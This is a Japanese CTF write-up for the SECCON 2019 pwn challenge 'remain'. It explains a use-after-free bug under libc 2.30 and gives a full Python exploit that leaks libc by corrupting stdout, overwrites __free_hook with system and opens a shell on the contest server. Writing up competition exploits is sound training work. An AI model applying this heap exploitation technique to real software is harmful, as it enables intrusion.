# [pwn 418pts] remain - SECCON CTF 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f remain_694c2020e3831ebd83b8152600c071af047bdfe4
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   83 Symbols     Yes      0               4       remain_694c2020e3831ebd83b8152600c071af047bdfe4
```
UAFでeditできます。libc-2.30なのでdouble freeしないように注意します。
また、mallocできる回数が結構ギリギリに制限されているので使ったチャンクを再利用するなどして工夫しましょう。
show系が無いので`_IO_2_1_stdout_`を破壊しました。
```python
from ptrlib import *

flag = False
def exploit():
    global flag
    if flag: return
    """
    sock = Process([
        "./ld-linux-x86-64.so.2",
        "--library-path", "./",
        "./remain_694c2020e3831ebd83b8152600c071af047bdfe4"
    ])
    """
    sock = Socket("remain.chal.seccon.jp", 27384)
    #"""

    def add(data):
        sock.sendlineafter("> ", "1")
        sock.sendafter("> ", data)
        return
    def edit(index, data):
        sock.sendlineafter("> ", "2")
        sock.sendlineafter("> ", str(index))
        sock.sendafter("> ", data)
        return
    def delete(index):
        sock.sendlineafter("> ", "3")
        sock.sendlineafter("> ", str(index))
        return

    # libc leak
    add("A" * 0x47) # 0
    add("A" * 0x47) # 1
    add("A" * 0x47) # 2
    delete(1)
    delete(2)
    edit(2, b'\x90')
    add("A" * 0x47)          # 3 == 2
    add(b"A" * 8 + p64(0x581)) # 4
    delete(3)
    delete(1)
    edit(1, b'\xa0\xf0')
    add("A" * 0x47) # 5 == 3 == 2
    add(b"A" * 8 + b'\x10\xff') # 6
    delete(5)
    edit(6, b"A" * 8 + b'\x10\xf8')
    add((p64(0) + p64(0x21)) * 4) # 7
    delete(2)
    delete(1)
    delete(0)
    try:
        edit(4, b"A" * 8 + b'\x51\x00')
    except AttributeError:
        sock.close()
        return
    except:
        exit()
    edit(0, b'\xa0\xe6')
    edit(6, b"A" * 8 + b'\xa0\xf2')
    add("A" * 0x47) # 8
    fake_IO  = p64(0xfbad1800)
    fake_IO += p64(0) * 3
    fake_IO += b'\x08'
    add(fake_IO) # 9
    libc_base = u64(sock.recv(8)) - libc.symbol("_IO_2_1_stdin_")
    print(hex(libc_base))
    if libc_base < 0x7f0000000000:
        sock.close()
        return
    logger.info("libc base = " + hex(libc_base))
    flag = True
    delete(0)

    # overwrite __free_hook
    edit(6, b"A" * 8 + p64(libc_base + libc.symbol("__free_hook") - 8)[:6])
    add(b"/bin/sh\x00" + p64(libc_base + libc.symbol("system")))

    sock.sendline("ls")
    sock.sendline("cat flag.txt")

    sock.interactive()

import threading
import time
libc = ELF("./libc.so.6")
while not flag:
    th = threading.Thread(target=exploit, args=())
    th.start()
    time.sleep(0.1)
```

# 感想
2.30だと2.29と何が違うんだろう。
